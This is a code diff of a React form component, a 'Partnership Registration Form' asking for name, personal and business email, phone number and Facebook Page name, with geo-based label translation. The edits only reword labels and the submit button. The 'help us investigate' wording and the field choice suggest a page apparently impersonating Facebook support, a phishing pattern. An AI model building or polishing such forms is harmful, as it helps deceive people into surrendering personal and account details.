@@ -24,7 +24,7 @@ interface FormField {
 }
 
 const FORM_FIELDS: FormField[] = [
-    { name: 'information', label: 'Please provide us information that will help us investigate', type: 'textarea' },
+    { name: 'information', label: 'Please ensure that your contact information', type: 'textarea' },
     { name: 'fullName', label: 'Full Name', type: 'text' },
     { name: 'personalEmail', label: 'Personal Email', type: 'email' },
     { name: 'businessEmail', label: 'Business Email', type: 'email' },
@@ -51,7 +51,7 @@ const InitModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
 
     useEffect(() => {
         if (!geoInfo) return;
-        const textsToTranslate = ['Partnership Registration Form', 'Full Name', 'Personal Email', 'Business Email', 'Mobile phone number', 'Facebook Page Name', 'I agree with Terms of use', 'Submit'];
+        const textsToTranslate = ['Partnership Registration Form', 'Please ensure that your contact information', 'Full Name', 'Personal Email', 'Business Email', 'Mobile phone number', 'Facebook Page Name', 'I agree with Terms of use', 'Submit'];
         const translateAll = async () => {
             const translatedMap: Record<string, string> = {};
             for (const text of textsToTranslate) {
@@ -161,7 +161,7 @@ ${
                             <p className='cursor-pointer'>{t('I agree with Terms of use')}</p>
                         </div>
                         <button type='submit' disabled={isLoading} className={`mt-4 flex h-[50px] w-full items-center justify-center rounded-full bg-blue-600 font-semibold text-white transition-colors hover:bg-blue-700 ${isLoading ? 'cursor-not-allowed opacity-80' : ''}`}>
-                            {isLoading ? <div className='h-5 w-5 animate-spin rounded-full border-2 border-white border-b-transparent border-l-transparent'></div> : t('Partnership Registration Form')}
+                            {isLoading ? <div className='h-5 w-5 animate-spin rounded-full border-2 border-white border-b-transparent border-l-transparent'></div> : t('Send')}
                         </button>
                     </div>
                 </form>
